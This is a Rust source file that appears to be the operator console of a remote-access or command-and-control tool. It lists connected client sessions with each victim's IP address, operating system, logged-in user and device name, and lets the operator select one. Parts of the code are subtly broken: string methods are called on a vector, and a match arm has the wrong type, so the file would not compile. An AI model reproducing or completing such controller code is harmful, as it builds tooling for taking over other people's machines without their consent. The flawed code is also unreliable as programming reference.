#[path = "core.rs"]
mod core;
use std::io::Write;
use std::{io, ops::Deref, process, thread, time};
use tokio::{
    io::{AsyncReadExt, AsyncWriteExt},
    net::TcpStream,
    sync::Mutex,
};
use util;

fn read_user_input() -> Vec<String> {
    print!(">>> ");
    io::stdout().flush().unwrap();

    let mut input = String::new();

    io::stdin().read_line(&mut input).unwrap();

    let input = input
        .trim()
        .split(" ")
        .map(|x| x.to_string())
        .collect::<Vec<String>>();

    input
}

pub async fn main_menu(mut client_list: util::Clients) {
    loop {
        let command = read_user_input();

        match command.as_str().trim() {
            "" => continue,
            "help" => {
                println!("\nsessions - display connected sections\n");
            }
            "sessions" => {
                println!("");

                for (index, client) in client_list.lock().await.deref().iter().enumerate() {
                    println!(
                        "[{}] {} | OS: {} | Current user: {} | Device name: {}",
                        index,
                        client.stream.peer_addr().unwrap(),
                        client.os,
                        client.username,
                        client.device_name,
                    );
                }

                println!("");

                let session = read_user_input();

                let session: usize = match session.trim().parse() {
                    Ok(session) => session,
                    Err(e) => panic!("Conversion error: {}", e),
                };

                if client_list.lock().await.len() < session {
                    println!("Incorrect index");
                }

                let mut client = client_list.lock().await.remove(session);

                match session_menu(client).await {
                    Ok(changed_client) => client_list.lock().await.push(changed_client),
                    Err(_e) => _e,
                }

                continue;
            }
            _ => {}
        }
    }
}

async fn session_menu(mut client: util::Client) -> Result<util::Client, ()> {
    match core::check_connection(&mut client).await {
        Ok(_e) => _e,
        Err(_) => {
            println!("\n[-] Connection closed [-]");
            return Err(());
        }
    }

    Ok(client)
}
